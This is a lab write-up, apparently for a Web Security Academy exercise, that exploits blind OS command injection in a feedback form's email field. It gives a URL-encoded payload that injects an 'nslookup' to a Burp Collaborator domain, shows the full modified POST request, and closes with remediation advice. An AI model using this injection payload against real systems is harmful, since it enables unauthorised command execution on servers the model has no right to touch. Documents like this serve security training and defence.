Objective: Exploit a blind OS command injection vulnerability to force the target server to perform an out-of-band DNS lookup to an external server controlled by the attacker (Burp Collaborator).

Vulnerability Analysis
Vulnerable Feature: Submit Feedback form.

Target Parameter: The email field within the HTTP POST request body.

Root Cause: The backend application takes user input from the email parameter and passes it directly into a system command (likely a mail-sending script) without properly sanitizing or escaping shell metacharacters (such as ;, |, &).

Exploitation Type: Because the application only returns a generic 200 OK and does not display the output of the executed command on the screen (Blind), an Out-of-Band (OOB) technique is required. By injecting an nslookup command, we force the server to resolve a domain we control, providing concrete evidence that the command executed.

Exploitation Steps
1. Intercept the Request
Navigate to the "Submit feedback" page, fill in the form with dummy data, and click Submit. Use Burp Suite Proxy to intercept the POST /feedback/submit request.

2. Initialize the OOB Receiver
Open the Burp Collaborator tab in Burp Suite and click "Copy to clipboard" to generate a unique subdomain payload (e.g., w8p8xyz.oastify.com).

3. Craft and Inject the Payload
Send the intercepted request to Repeater. Modify the email parameter to inject the payload.

Intended System Command: <server_mail_command> your_email ; nslookup w8p8xyz.oastify.com ;

The first semicolon (;) terminates the original backend mail command, instructing the Linux OS to execute our injected nslookup command next. The trailing semicolon ensures any trailing code appended by the server is safely separated.

URL Encoding: To maintain a valid application/x-www-form-urlencoded structure, encode the semicolons as %3B and spaces as +.

Final Payload:

Plaintext
email=hahaha%40gmail.com%3B+nslookup+w8p8xyz.oastify.com+%3B
Modified HTTP Request:
```
HTTP
POST /feedback/submit HTTP/2
Host: 0a110024042d1be480cbe944001b00df.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=KWxeDqguJFEoYVVlVDpzPkqhykZauKHa&name=belpheg3r&email=hahaha%40gmail.com%3B+nslookup+w8p8xyz.oastify.com+%3B&subject=123&message=1234
```
4. Execute and Verify
Click Send in Repeater. The target server will respond with HTTP/2 200 OK. Return to the Burp Collaborator tab and click Poll now. You will see DNS lookup records originating from the target server's IP address. This confirms the system executed the command in the background, and the lab will be marked as Solved.

Remediation
To prevent OS command injection, developers should implement the following defenses:

Avoid Direct Shell Invocation: Never pass user input directly into OS-level commands. Use built-in language APIs or dedicated libraries (e.g., using a native SMTP library to send emails instead of calling the OS mail utility).

Strict Input Validation: If passing input to a system process is absolutely unavoidable, implement strict allow-list validation. For an email field, use a robust regex to ensure the input strictly matches standard email formats and reject any string containing shell metacharacters.
<img width="956" height="446" alt="image" src="https://github.com/user-attachments/assets/666d4950-c65c-4a8c-bee9-50fedceb196a" />
